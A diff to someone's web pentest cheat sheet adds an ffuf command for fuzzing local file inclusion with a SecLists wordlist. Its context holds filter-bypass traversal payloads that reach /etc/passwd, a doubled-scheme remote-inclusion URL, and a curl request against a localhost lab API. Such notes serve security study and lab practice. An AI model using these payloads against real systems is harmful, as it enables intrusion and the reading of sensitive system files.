@@ -51,6 +51,8 @@ Clusterbomb attack
 -     curl -X PUT -H "Content-Type: application/json" -d '{token: "JWT", username:"username", bio: "New bio information."}' http://localhost/labs/api/account.php
 
 # Local File Inclusion
+using ffuf
+-     ffuf -request api.txt -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 19,20
 some filters bypass
 -     ..././..././..././..././..././etc/passwd
 -     hthttptp://10.10.16.2:8000/file.txt
